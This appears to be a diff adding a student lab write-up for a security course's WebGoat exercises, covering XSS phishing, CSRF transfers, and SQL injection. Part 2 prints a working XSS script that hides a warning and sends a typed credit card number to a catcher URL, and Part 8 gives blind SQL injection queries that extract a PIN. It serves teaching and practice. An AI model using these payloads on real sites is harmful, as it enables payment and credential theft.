@@ -1,0 +1,67 @@
+#Zixuan Zhai, 1006979389, shawn.zhai@mail.utoronto.ca
+#Victor Wu, 1007069039, victorzhenchuan.wu@mail.utoronto.ca
+
+Part 1
+Attacker can inject malicious HTML code through the search field on the webpage. 
+We injected our code into the search bar so that a phishing login interface pop up 
+when a user click "Search". The malicious code tricks the user to enter their 
+credentials, the information will then be sent to the attacker.
+
+Part 2
+The field to enter three digit access code is exploitable. Malicious code is 
+injected into the that field in the URL. The code will be used to steal credit 
+card number entered. Decoded url:
+
+http://localhost:9867/WebGoat/start.mvc#attack/297061215/900?input1=888&input2=
+<script>
+document.getElementsByName("input2")[0].value = '000';
+document.getElementById('message').style.display = "none";
+document.form.buy.addEventListener('click', function() {
+  let captureImage = new Image();
+  let creditCardNumber = document.getElementsByName("input1")[0].value;
+  captureImage.src = "http://localhost:9867/WebGoat/catcher?PROPERTY=yes&stolenCardNum=" + encodeURIComponent(creditCardNumber);
+});
+</script>
+
+Firstly overwrite the "input2" to "000" (the default value). Secondly, I change the 
+display style of the warning message (the Whoops... thing) to none so that it does 
+not show up. Both for making the malicious site look as  close as possible to the original 
+site to be stealthy and confuse the victim. The final chunk of the script steals the credit 
+card number and sends to the attacker.
+
+Part 3
+We injected an image with malicious src into the message field of the email. Once the 
+victim open the malicious email, it will load the image and transfer the amount of money
+specified by the "transfer" attribute away from their account.
+
+Part 4
+We injected two images in the message field. The first one sets up a transfer and the second 
+bypasses the prompt during the request and sets its url to confirm the transfer. This is 
+similar to part 3, just use another image to bypass the prompt.
+
+Part 5
+The vulnerability is that the transaction token is returned to the HTML page. We injected two 
+iframes and a script with into the message field. The first iframe's src starts the transfer 
+and passes the token value to the second iframe. Then a second iframe is used to complete the 
+transaction using the token.
+
+Part 6
+The SQL query interface does not validate the input, which leads to injection vulnerability.
+This allows us to add more return condition to the query so that the system gives us more
+results that we should not be able to see.
+
+Part 7
+Same vulnerability as part 6. We terminate the query that is intended for user to use and
+execute more queries. This allowed us to edit information and add trigger to the system's
+database. 
+Note: ece568_24s@utoronto.ca didn't work, we used ece568_22s@utoronto.ca according to piazza
+
+Part 8
+Same vulnerability as part 6 & 7. Firstly, since the this query returns a boolean result,
+we used the following two query input to narrow down the range for the PIN by adjusting two
+values that compare to the real PIN (start at the range of 1111 to 9999):
+101 and (select pin from credit where cc_number = 1234123412341234) > 1111;
+101 and (select pin from credit where cc_number = 1234123412341234) < 9999;
+
+Finally, we got to the PIN number 3318 which is then verified with this input:
+101 and (select pin from credit where cc_number = 1234123412341234) = 3318;
